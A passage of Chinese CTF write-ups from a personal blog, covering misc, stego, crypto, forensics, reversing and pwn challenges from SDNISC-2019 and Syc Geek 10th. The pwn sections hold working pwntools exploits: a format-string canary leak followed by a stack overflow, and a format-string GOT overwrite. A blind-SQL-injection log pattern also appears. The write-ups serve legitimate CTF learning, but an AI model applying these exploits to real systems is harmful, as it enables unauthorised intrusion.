backdoor proc near.text:00000000004008DA ; __unwind &#123;.text:00000000004008DA push rbp.text:00000000004008DB mov rbp, rsp.text:00000000004008DE mov edi, offset command ; \"/bin/cat ./flag\".text:00000000004008E3 call _system.text:00000000004008E8 nop.text:00000000004008E9 pop rbp.text:00000000004008EA retn.text:00000000004008EA ; &#125; // starts at 4008DA.text:00000000004008EA backdoor endp.text:0000000000一道简单的pwn题, 考察通过格式化字符串漏洞泄露canary,然后再进行栈溢出ret。首先通过手动测出来偏移为6。由于我们的canary距离buf有0x90 - 0x8 = 0x88个字节,而程序是64位的,所以每八个字节一组, 0x88字节即为17组。 所以我们canary距离我们输入的偏移为6 + 17 = 23。所以就可以直接通过格式化字符串泄露canary了,然后就是基础的rop了。1234567891011121314151617181920212223242526272829303132333435from pwn import *#context.log_level = 'debug'c = remote('111.198.29.45',44367)target = 0x4008DAc.recvuntil('3. Exit the battle')c.sendline('2')sleep(0.1)c.sendline('%23$p')c.recvuntil('0x')canary = c.recv(16)log.success('canary = ' + canary)canary = int(canary,16)c.recvuntil('3. Exit the battle')c.sendline('1')payload = 'a'*(0x90-0x8) + p64(canary) + 'a'*8 + p64(target)sleep(0.1)c.sendline(payload)c.interactive()0x007 未完待续","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"Sdnisc-2019","slug":"Sdnisc-2019","date":"2019-11-04T05:39:00.000Z","updated":"2019-11-19T01:16:50.345Z","comments":true,"path":"2019/11/04/Sdnisc-2019/","link":"","permalink":"http://liul14n.top/2019/11/04/Sdnisc-2019/","excerpt":"","text":"0x00 前言菜是原罪。目前还未更完,持续更新中…0x01 MISC0x001 签到题拖入IDA查看字符串即可得到flag,或者不拖入IDA,直接记事本打开搜索flag也能找到。0x002 上下左右脑洞大开的题目,考察PIL库或者turtal库等的使用。D代表Down(下),R代表Right(右),L代表Left(左),U代表UP(上)。脚本如下。12345678910111213141516171819202122# -*- coding: UTF-8 -*-from PIL import Image#xyij这几个可以根据情况自行在合适的范围内调整。x = 200y = 200i = 5j = 5im = Image.new(\"RGB\", (x, y))im.putpixel((i,j),(255,255,255))with open('C:\\\\Users\\\\LiuLian\\\\Desktop\\\\flag.txt','r') as file: str = file.read() for s in str: if s == 'D': j+=1 elif s == 'R': i+=1 elif s == 'U': j-=1 elif s == 'L': i-=1 im.putpixel((i, j), (255, 255, 255))im.show()运行脚本就能画出来flag了。0x003 压缩包的秘密用16进制查看器查看文件发现压缩包flag.zip的每相邻两个字节互换了位置,写个脚本还原回去。脚本如下:12345678910# -*- coding: UTF-8 -*-f = open('C:\\\\Users\\\\LiuLian\\\\Desktop\\\\misc3\\\\flag.zip','rb')ff = open('C:\\\\Users\\\\LiuLian\\\\Desktop\\\\misc3\\\\newflag.zip','wb')str = f.read()for i in range(0,len(str),2): ff.write(str[i+1]) ff.write(str[i])f.close()ff.close()还原以后发现压缩包有密码,用16进制查看器查看发现尾部有一段字符串dGhlcmUtaXMtaGFsZi1wd2Qtc2hlbnNp,是一段base64,解码以后是there-is-half-pwd-shensi,也就是说shensi是压缩包密码的一半。那么掩码爆破另外6个字符即可,不到半分钟就能爆破出来,爆破得到最终密码为sdniscshensi,解压压缩包即可得到flag。0x02 Stego0x001 啾咪~又一道想暴打出题人的题目,这道题竟然有一半左右的人做出来???用Stegosolve打开,Analyse-Data Extract。这么勾选(这道题是BGR)然后点Preview,能找到一串base64(出题人还不忘提醒这就是flag.txt),解码得到flag。0x002 我和我的祖国考察音频隐写。将附件拖入Audacity,在末尾,有猫腻。向上表示1,向下表示0得到0110011001101100011000010110011101111011011001100110010100111000011001100110010000110100001101100011100000110010001100000011010100110001001100110110001000110101001101000110001101100100011001000011010100111001011000100011000000110100001110000011010100110111001100010011100101100110001110010011010001111101bin转ascii得到flag。0x003 你真的很不错根据题目提示要求用winrar,考虑到这道题目是NTFS流隐写。打开工具NtfsStreamsEditor,用winrar将附件flag.rar里面的内容解压出来,然后在NtfsStreamsEditor搜索,找到flag.png。导出flag.png,查看该图片即可得到flag。0x03 Crypto0x001 简单的密码学考察培根密码,解密得到BACONEASY。0x003 被加密的消息考察RSA相关知识。后续会写一篇关于RSA的博客, 解密脚本如下:123456789101112131415import gmpy2import libnume = 65537n = 132874559018378928431039440207926203692459793792348908672840445003264268709142821089064063059664054997624354040367339834740402484489217092916932927523665031792688652405172441259540233143526085691290500429921362666149858204259223146323188880312113596285869242888916181594189809400830983088384594648368192585387dp = 591317922916712527852981087692920294081526731184970969084059479425641071480269272618065340614260809042370271672930352969371906804874484366604552515101473c = 105561263344197224500437985369890277605607419491189003046055021715638244356677672489534224683808733691744645034854814587326664189059178955870261337977176277155277781998771630340367082086864012637516012166291357901866101513273848851471805311144501065601880125348980410104702516232148506526616670074084982119236for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi print libnum.n2s(pow(c,d,n))0x04 Forensic0x001 日志分析考察盲注日志分析以及写脚本(正则)的能力。比赛的时候脚本写不出来,手撕的,费眼而且费了不少时间…找规律可以得到如上图所示: 在每个C1、C2、C3、C4...区间中,从下往上找第一个状态码200右边的那个值为215的日志对应的%3E后面的那个数。。。那个数就是flag中某一位的ascii码, 而且从C1一直到C38~ 依次找到的是flag的第一位、第二位….第三十八位。至于怎么找到的这个规律…WEB选手可能有别的办法,但卑微菜鸡是把flag{正向输出得到ascii码为102 108 97 103 123,然后通过ascii码去找对应的215(Response包的长度),然后基本找到规律以后又去验证了一下第38位},根据规律果然能得到应有的结果125。这种找规律的方法带有猜的因素, 但是前面几道题目的flag大都是38位:flag{ + 32位的16进制(大概是md5), + }, 能做出来这个也算是我走运吧~赛后写了个匹配脚本(re大法好):123456789101112131415161718192021# -*- coding: UTF-8 -*-import ref = open('C:\\\\Users\\\\LiuLian\\\\Desktop\\\\access.log','r')buf = f.read()#匹配所有结果为215的字符串, 匹配两个部位,第一个部位匹配的是C1、C2....Cn,第二个部位匹配flag的Ascii码值。pattern = r'LIMIT%200%2C1%29%2C(\\w+)%2C1%29%29%3E(\\w+)%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1\" 200 215'pattern = re.compile(pattern)#利用findall方法大概可以方便一些吧。L = re.findall(pattern,buf)flag = ''Cn = 1for i in range(len(L)): CurCn = int(L[i][0]) if CurCn &gt; Cn: flag += chr(int(L[i-1][1])) Cn = CurCnprint flagf.close()0x004 流量分析考察USB流量分析。用wireshark从附件hack.pcapng中可以提取出来一个zip文件,名字为flag.zip。zip的密码可以通过分析USB流量获得。USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来。Mac或者Linux下的命令为tshark -r hack.pcapng -T fields -e usb.capdata,如果想导入usbdata.txt文件中，后面加上参数：&gt;usbdata.txt。Windows下如果安装了wireshark,可以在wireshark的安装目录下找到tshark.exe,调用cmd定位到wireshark的安装目录下,并将hack.pcapng也放到安装目录下,用命令tshark.exe -r hack.pcapng -T fields -e usb.capdata,同样如果要导入到txt文件中,后面也要加上参数。键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usb packet。鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。下方通过python字典的形式列出了usb keyboard的映射关系。12normalKeys = &#123;\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;shiftKeys = &#123;\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"&#123;\",\"30\":\"&#125;\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;所以完整解密脚本如下(已经将Leftover Capture Data提取到usbdata.txt中):1234567891011121314# -*- coding: UTF-8 -*-f = open('C:\\\\Users\\\\LiuLian\\\\Desktop\\\\usbdata.txt','r')Lines = f.readlines()normalKeys = &#123;\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;shiftKeys = &#123;\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"&#123;\",\"30\":\"&#125;\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;message = ''for line in Lines: if len(line.replace('\\n',''))!=16: pass elif normalKeys.get(line[4:6]) != None: message += normalKeys.get(line[4:6])print message得到压缩包密码,解压即可得到flag.txt,里面就有flag。0x05 Re0x001Python是世界上最好的语言比赛时这道题反编译总是不成功,还以为是工具出了问题…结果比完以后大佬告诉我pyc的文件头被改了…正常的pyc的文件头应该是03 F3 0D 0A,而这道题被改成20 19 0D 0A, 把文件头再改回来以后就可以正常反编译了。这算法和素数有关,懒得逆回去了,直接正向爆破(因为知道了输出)。根据其他题的flag, 这道题目的flag也会是由0123456789abcdef以及lg{}(用来组成flag)组成,那么只需要解出来这些里的每个字符的输出, 然后去跟题目给的输出进行比对就能找出flag。(如果觉得flag还会由其他字符组成,可自行尝试,原理一样)所以Python脚本如下,写脚本的能力还是有待提高啊!123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# -*- coding: UTF-8 -*-import math#可能存在于flag中的字符。flagtable = '0123456789abcdeflg&#123;&#125;'#定义的一个字典,用于保存flag字符及其对应的键值。dic = &#123;&#125;Sd = []SdSd = []for SdSdSdSd in flagtable: Sd.append(ord(SdSdSdSd))def func(SdSdSd): SdSdSdSdSd = True SdSdSdSd = 2 sq = int(math.sqrt(SdSdSd)) + 1 while SdSdSdSd &lt;= sq: if SdSdSd % SdSdSdSd == 0: SdSd.append(SdSdSdSd + 1) SdSdSdSdSd = False func(SdSdSd / SdSdSdSd) SdSdSdSd += 1 break SdSdSdSd += 1 if SdSdSdSdSd: SdSd.append(SdSdSd + 1)for SdSdSdSd in Sd: func(SdSdSdSd) dic.update( &#123;chr(SdSdSdSd) : SdSd&#125; )#这个位置根据题目的py脚本改的。 SdSd = []#自己定义了一个根据键值寻找键的函数,python好像没有现成的函数？def get_key(d,value): return [k for k,v in d.items() if v == value]#这三行把out.txt的内容转换成了一个List的形式, print s以后直接把输出结果复制粘贴,然后赋值给outList就行~#outstr = '''['3', '4', '18'] ['3', '3', '4', '4', '4'] ['98'] ['104'] ['4', '42'] ['102'] ['3', '8', '8'] ['3', '3', '3', '3', '4'] ['4', '4', '12'] ['3', '4', '18'] ['3', '6', '6'] ['3', '4', '18'] ['8', '8'] ['3', '8', '8'] ['3', '4', '18'] ['4', '4', '12'] ['4', '20'] ['4', '20'] ['4', '20'] ['3', '3', '3', '3', '4'] ['102'] ['102'] ['4', '18'] ['3', '3', '6', '6'] ['4', '18'] ['4', '20'] ['4', '20'] ['98'] ['3', '6', '6'] ['3', '8', '8'] ['3', '8', '8'] ['3', '3', '6', '6'] ['102'] ['4', '18'] ['3', '3', '6', '6'] ['3', '3', '6', '6'] ['3', '3', '14'] ['6', '6', '6']'''#s = outstr.replace('\\'' , '').replace('] [' , '] , [')#print soutList = [[3, 4, 18] , [3, 3, 4, 4, 4] , [98] , [104] , [4, 42] , [102] , [3, 8, 8] , [3, 3, 3, 3, 4] , [4, 4, 12] , [3, 4, 18] , [3, 6, 6] , [3, 4, 18] , [8, 8] , [3, 8, 8] , [3, 4, 18] , [4, 4, 12] , [4, 20] , [4, 20] , [4, 20] , [3, 3, 3, 3, 4] , [102] , [102] , [4, 18] , [3, 3, 6, 6] , [4, 18] , [4, 20] , [4, 20] , [98] , [3, 6, 6] , [3, 8, 8] , [3, 8, 8] , [3, 3, 6, 6] , [102] , [4, 18] , [3, 3, 6, 6] , [3, 3, 6, 6] , [3, 3, 14] , [6, 6, 6]]flag = ''for key in outList: flag += get_key(dic,key)[0]print flag0x06 Moble0x001 简单的apk根据关键算法123456789101112131415161718192021222324252627282930313233343536373839public String check(String paramString)&#123; Object localObject = paramString.toCharArray(); if (localObject.length == 0) &#123; return \"请输入内容\"; &#125; int i = 0; for (int j = 0; j &lt; localObject.length; j++) &#123; if (localObject[j] &lt; '0') &#123; return \"你的输入应该为纯数字！\"; &#125; if (localObject[j] &gt; '9') &#123; return \"你的输入应该为纯数字！\"; &#125; &#125; if (localObject.length != 15) &#123; return \"出错啦！\"; &#125; localObject = \"\"; for (j = i; j &lt; paramString.length(); j++) &#123; StringBuilder localStringBuilder = new StringBuilder(); localStringBuilder.append((String)localObject); i = paramString.charAt(j); localStringBuilder.append(new char[] &#123; 83, 100, 110, 105, 115, 99, 50, 48, 49, 57 &#125;[(i - 48)]); localObject = localStringBuilder.toString(); &#125; if (((String)localObject).equals(\"sic19Sdc02ds10c\")) &#123; localObject = new StringBuilder(); ((StringBuilder)localObject).append(\"flag&#123;\"); ((StringBuilder)localObject).append(md5(paramString)); ((StringBuilder)localObject).append(\"&#125;\"); return ((StringBuilder)localObject).toString(); &#125; return \"你输入的数字不正确\";&#125;可以得到脚本如下:1234567891011# -*- coding: UTF-8 -*-import md5s = 'sic19Sdc02ds10c'L = [83, 100, 110, 105, 115, 99, 50, 48, 49, 57]input = ''for i in s: input += str(L.index(ord(i)))flag = 'flag&#123;' + md5.md5(input).hexdigest() + '&#125;'print flag0x002 贪吃蛇关键函数在这俩根据代码可以得知,paramInt1应该为90, 然后由paramInt1、paramInt2、paramInt3组成的字符串总共8位。没必要逆算法,直接正向爆破。鉴于str的形式可能是90XXXXXX(其中第一个X取值为1~9),也可能是900XXXXX,所以采用如下方法进行爆破。(应该会有更优的方案。)把encrypt(int paramInt1, int paramInt2, int paramInt3)变成encrypt(int paramInt1),下面只保留((StringBuilder)localObject).append(String.valueOf(paramInt1));,这样算是为了方便爆破吧…爆破脚本如下(Java):123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package test_for_ctf;import java.math.BigInteger;import java.security.MessageDigest;public class test &#123; public static class encode &#123; private static final String Code = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; public static String encode(String paramString) &#123; if ((paramString != null) &amp;&amp; (paramString.length() != 0)) &#123; char[] arrayOfChar = paramString.toCharArray(); StringBuilder localStringBuilder1 = new StringBuilder(); for (int i = 0; i &lt; arrayOfChar.length; i++) &#123; StringBuilder localStringBuilder2; String localObject; for (localObject = Integer.toBinaryString(arrayOfChar[i]); ((String)localObject).length() &lt; 8; localObject = localStringBuilder2.toString()) &#123; localStringBuilder2 = new StringBuilder(); localStringBuilder2.append(\"0\"); localStringBuilder2.append((String)localObject); &#125; localStringBuilder1.append((String)localObject); &#125; while (localStringBuilder1.length() % 6 != 0) &#123; localStringBuilder1.append(\"0\"); &#125; Object localObject = String.valueOf(localStringBuilder1); arrayOfChar = new char[((String)localObject).length() / 6]; int i = 0; for (i = 0; i &lt; arrayOfChar.length; i++) &#123; int j = Integer.parseInt(((String)localObject).substring(0, 6), 2); localObject = ((String)localObject).substring(6); arrayOfChar[i] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\".charAt(j); &#125; localObject = new StringBuilder(String.valueOf(arrayOfChar)); if (paramString.length() % 3 == 1) &#123; ((StringBuilder)localObject).append(\"==\"); &#125; else if (paramString.length() % 3 == 2) &#123; ((StringBuilder)localObject).append(\"=\"); &#125; for (i = 76; i &lt; ((StringBuilder)localObject).length(); i += 76) &#123; ((StringBuilder)localObject).insert(i, \"\\r\\n\"); &#125; return String.valueOf(localObject); &#125; return paramString; &#125; &#125; public static String encrypt(int paramInt1) &#123; Object localObject = new StringBuilder(); ((StringBuilder)localObject).append(String.valueOf(paramInt1)); String str = ((StringBuilder)localObject).toString(); if (str.length() == 8) &#123; try &#123; localObject = MessageDigest.getInstance(\"md5\").digest(encode.encode(str).getBytes()); localObject = new BigInteger(1, (byte[])localObject).toString(16); for (paramInt1 = 0; paramInt1 &lt; 32 - ((String)localObject).length(); paramInt1++) &#123; StringBuilder localStringBuilder = new StringBuilder(); localStringBuilder.append(\"0\"); localStringBuilder.append((String)localObject); localObject = localStringBuilder.toString(); &#125; if (((String)localObject).equals(\"cc3fa9c107c0d8b48d6af32d26eacf2a\")) &#123; localObject = new StringBuilder(); ((StringBuilder)localObject).append(\"flag&#123;\"); ((StringBuilder)localObject).append(str); ((StringBuilder)localObject).append(\"&#125;\"); return ((StringBuilder)localObject).toString(); &#125; return \"something wrong\"; &#125; catch (Exception localException) &#123; throw new RuntimeException(\"没有这个md5算法\"); &#125; &#125; return \"something wrong\"; &#125; public static void main(String[] args) &#123; //爆破str格式为900xxxxx的情况 for(int i = 0;i&lt;=99999;i++) &#123; String str = new String(\"900\"); str += i; int a = Integer.parseInt(str); String sss = encrypt(a); if(sss!=\"something wrong\") &#123; System.out.println(sss); &#125; &#125; //爆破str格式为90xxxxxx的情况 for(int i = 0;i&lt;=999999;i++) &#123; String str = new String(\"90\"); str += i; int a = Integer.parseInt(str); String sss = encrypt(a); if(sss!=\"something wrong\") &#123; System.out.println(sss); &#125; &#125; &#125;&#125;运行得到flag。0x07 Pwn0x001 pwn_MinZhu考察格式化字符串漏洞。程序首先要求输入一段Key并进行验证。这个Key手撕就能弄出来,解出来以后是xNd9y6也可以用angr(借鉴表哥思路)1234567import angrp = angr.Project(\"./pwn_MinZhu\")state = p.factory.entry_state()sm = p.factory.simulation_manager(state)res = sm.explore(find=0x08048817,avoid=0x0804882B)print res.found[0].posix.dumps(0)通过验证后可以来到这个函数,并且发现这个函数存在明显的格式化字符串漏洞。这里的dword_804A064为1, 也就意味着循环只能执行一次,似乎一次循环是不够的,所以可以先通过修改这个值来让循环执行更多次数从而多次利用格式化字符串漏洞。发现了cat flag,但需要满足dword_804A060 == 0x2019。所以基本思路确定了, 第一次循环先改掉dword_804A064的值,让这个值大于等于3, 第二次循环让 dword_804A060 == 0x2019, 第三次循环把puts的got换为cat flag所在的地址,这里也可以更换putchar的got。exp如下:12345678910111213141516171819202122232425262728293031323334353637from pwn import *c = remote('172.29.1.28',9999)#c = process('./pwn_MinZhu')elf = ELF('./pwn_MinZhu')putsgot = elf.got['puts']totalnum = 0x0804A064targetnum = 0x0804A060system_addr = 0x08048696pwd = 'xNd9y6'c.recvuntil('Key:')c.sendline(pwd)c.recvuntil('your msg:')payload1 = fmtstr_payload(4,&#123;totalnum:0x03&#125;)c.sendline(payload1)payload2 = fmtstr_payload(4,&#123;targetnum:0x2019&#125;)c.sendline(payload2)payload3 = fmtstr_payload(4,&#123;putsgot:system_addr&#125;)c.sendline(payload3)c.interactive()","categories":[{"name":"CTF","slug":"CTF","permalink":"http://liul14n.top/categories/CTF/"}],"tags":[]},{"title":"Syc Geek 10th","slug":"Syc-Geek-10th","date":"2019-10-31T12:27:34.000Z","updated":"2020-05-20T14:29:40.137Z","comments":true,"path":"2019/10/31/Syc-Geek-10th/","link":"","permalink":"http://liul14n.top/2019/10/31/Syc-Geek-10th/","excerpt":"","text":"---------------------前言第十届极客大挑战结束了,感谢Syc的师傅们,赛题质量很高!学到了很多东西!菜是原罪！WEB0x01 打比赛前先撸一只猫不是web选手,但是基本的get传参之类的还是会的。查看源码发现了这个假的flag。直接get传参?get=dog 构造成http://118.25.14.40:8110/?cat=dog这种形式即可得到真正的flag。MISC0x01 签到签到,关注公众号即可签到拿flag。0x02 我好兴奋啊十六进制打开,搜索Syc{就能找到flag。0x03 翻过这座山在所给链接的github里面,有一个教翻墙的详细教程。而且里面有个注意事项,但是里面是假的flag, 真正的flag通过找这个翻墙项目的回收站(大概可以这么叫吧),里面有个flag.md,真正的flag在里面。0x04 散打黑客的压缩包两次爆破压缩包即可得到flag。0x05 是谁杀了谁这道题目我直接dnSpy动态调试拿到flag。或者解那个DES(我是没解出来..)官方WP如下:exe的逻辑如下 按钮点第一次 –&gt; 生成一个HP的隐藏文件（注意要在“我的电脑”里面勾选隐藏文件选项）按钮点第二次 –&gt; 往HP文件里面写入flag按钮点第三次 –&gt; 删除HP文件里面的flag按钮点第四次 –&gt; 删除HP文件原本出题的时候打算加壳，防止被逆向。后来想想可以多给一条路，于是没有加壳。所以逆 向选手也可以直接逆向分析。0x06 嘿,你喜欢吃鲱鱼罐头么?破伪加密拿到图片,详细信息里面给了提示它看起来像死鱼一样,图片末尾有一串oids串iisiiiisiiiiiiiiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddoiiodddoioioddoddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiooddddoiiiiiodddddddoddddddddoiiiiiiiiiioiiiiiiiiiioddddddddddddddddddddoiiiiioiodddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddoiiiiiiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddoiiiiiiiiiio根据提示,这和鲱鱼有关系, 最后了解到有一种编码叫deadfish编码。官方WP提供了解密网站:解密网站自己写解密脚本也不难, O 表示输出(output), s表示平方(square),d表示减(dec),i表示(inc),解密脚本如下:1234567891011121314151617181920212223#include&lt;stdio.h&gt;#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; string s = \"iisiiiisiiiiiiiiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddoiiodddoioioddoddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiooddddoiiiiiodddddddoddddddddoiiiiiiiiiioiiiiiiiiiioddddddddddddddddddddoiiiiioiodddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddoiiiiiiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddoiiiiiiiiiio\"; int sum = 0; for(int i=0;i&lt;s.size();i++) &#123; if(s[i]=='i')&#123; sum+=1; &#125;else if(s[i]=='s')&#123; sum=sum*sum; &#125;else if(s[i]=='d')&#123; sum-=1; &#125;else if(s[i]=='o')&#123; printf(\"%c\",sum); &#125; &#125; return 0;&#125;0x07 我也想成为r1ngshex转ascii以后是flag的立体字。真有新意。0x08 早点睡脑洞太大,官方WP如下:这题出的太智障了，原本都不打算放的… 首先010查看发现这是个psd文件，先把文件后缀改为psd。 然后用ps或者其他类似软件打开，可以看到有一个隐藏图层。里面有个链接。 访问之后下载到第二部分，利用base64转图片可以得到第二个链接。 访问之后下载到第三部分，利用base64转图片可以得到第三个链接。 